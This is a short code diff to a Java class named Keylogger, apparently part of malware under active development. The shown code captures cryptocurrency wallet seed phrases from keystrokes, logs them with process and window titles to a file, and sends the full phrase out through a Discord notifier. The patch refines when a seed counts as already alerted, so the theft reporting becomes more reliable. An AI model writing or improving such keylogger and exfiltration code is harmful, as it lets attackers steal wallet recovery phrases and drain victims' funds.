@@ -312,12 +312,14 @@ final class Keylogger {
 		if (seed != null) {
 			String words = seed.split(" ", -1).length == 24 ? "24" : "12";
 			boolean duplicate = SecretDetector.alertedRecently(seed);
-			SecretDetector.alerted(seed);
 			append(OpsPaths.seeds(installDir),
 				Instant.now() + " | " + process + " | " + title + " | " + seed + "\n");
 			state.passwordEvents++;
 			saveIfDue();
+			// Only mark as alerted when the notice actually goes out; otherwise
+			// a later memory finding would be suppressed with no prior alert.
 			if (!duplicate && DiscordConfig.sendPasswords()) {
+				SecretDetector.alerted(seed);
 				notifier.send("seed escrita: " + words + " palabras");
 				notifier.send(seed);
 			}
